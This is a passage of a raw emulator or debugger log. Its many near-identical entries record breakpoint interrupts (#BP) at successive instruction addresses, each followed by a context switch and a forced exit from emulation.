cip = 4564aa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4564c8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4564e3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456501, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456509, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456514, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45652d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45654e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45655c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456570, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45658b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45659a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4565a9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456632, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456644, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45665e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456671, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456686, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45669a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4566b2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4566c3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4566dd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4566ec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456709, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45671a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456721, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45673d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45674e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45675d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456770, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456776, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456784, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456784, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456784, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456791, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45679d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4567ab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4547f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454803, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454809, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454824, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454839, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454847, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548a9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548b9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548c9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548e0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548e7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4548f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45490f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45491d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454936, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454945, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454959, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45496e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454974, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454982, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454995, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549a5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549b2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549c7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549d7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549e6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4549fc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a08, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a23, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a33, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a3d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a5d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a67, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a71, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a89, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454a97, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ab3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ac2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454acc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ae1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454aed, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b03, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b17, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b21, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b32, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b42, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b60, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b6f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b7c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454b88, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ba2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c35, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c43, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c59, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c60, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c7e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c83, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454c9b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454cae, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454cc3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ccb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ce0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454cf5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d07, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456096, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45609b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4560b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4560d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4560e1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4560f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456102, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456107, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45611b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45612e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45613f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456153, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456163, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456177, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45618c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4561a7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4561bf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4561dd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4561f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45620b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45621d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45622a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456231, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456258, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456280, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456287, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4562a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4562ae, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4562d7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4562f3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45637d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456387, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456393, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4563aa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4563bb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4563c3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4563ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4563dd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456401, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45640a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45640e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 456424, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d6a5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d6c6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d6e9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d6fa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d6fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d70f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d729, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d742, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d759, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d773, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d794, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d798, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7b6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7ca, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7d8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7e5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d7f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d823, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d837, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d840, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d8d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d8e4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d8f8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d90a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d919, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d925, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d938, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d94f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d95b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d976, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d999, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d9a0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d9b3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d9be, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45be9c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bea8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45beb0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45becb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bedc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bef0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45befd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf14, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf23, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf2d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf40, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf64, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf78, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bf93, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bfa7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bfb2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bfbc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bfca, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bfde, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bff5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c002, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c024, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c03a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c056, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c065, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c079, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c087, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c098, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c0a2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c0b2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c0c7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c0d5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c0fc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c156, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c173, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c194, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c19e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1c1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1da, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c1f4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c20f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c230, cs = 23 context switch, stopping emulation forced exit memory 